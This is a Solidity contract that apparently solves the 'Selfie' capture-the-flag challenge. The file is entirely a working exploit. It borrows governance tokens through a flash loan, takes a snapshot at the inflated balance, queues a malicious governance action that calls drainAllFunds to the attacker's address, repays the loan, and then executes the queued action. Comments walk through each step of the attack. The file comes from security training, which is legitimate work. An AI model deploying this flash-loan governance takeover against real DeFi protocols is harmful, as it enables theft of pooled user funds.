pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface ISnapShotFunction {
    function snapshot() external returns(uint256);
}

interface IGovernance {
        function queueAction(address receiver, bytes calldata data, uint256 weiAmount) external returns (uint256);
        function executeAction(uint256 actionId) external payable;
    }

interface ISelfiePool {
    function flashLoan(uint256 borrowAmount) external;
}
contract SelfiePoolHack {

    address private owner;
    uint private actionId;
    IGovernance _governance;
    constructor( address _governanceAddress){
        owner = msg.sender;
        _governance = IGovernance(_governanceAddress);
    }
    function receiveTokens(address _tokenAddress, uint _amount) public {
        // Step : 2 Take governance token snapshot
        ISnapShotFunction(_tokenAddress).snapshot();
        // Step : 3 Create malicious data to pass to the governance contract
        bytes memory _malicious_data = abi.encodeWithSignature("drainAllFunds(address)", owner);
        // Step : 4 Queue action in the governance. Since we have taken snapshot with very high amount as balance. We can queue our malicious action.
        actionId = _governance.queueAction(msg.sender,_malicious_data, 0);
        // Step : 5 Repay flashLoan 
        IERC20(_tokenAddress).transfer(msg.sender, _amount);
    }

    function hackIt(address _selfiePool, uint _borrowAmount) external {
        // Step : 1 Take flashloan
        ISelfiePool(_selfiePool).flashLoan(_borrowAmount);
    }

    function executeHackAction() external {
        _governance.executeAction(actionId);
    }
}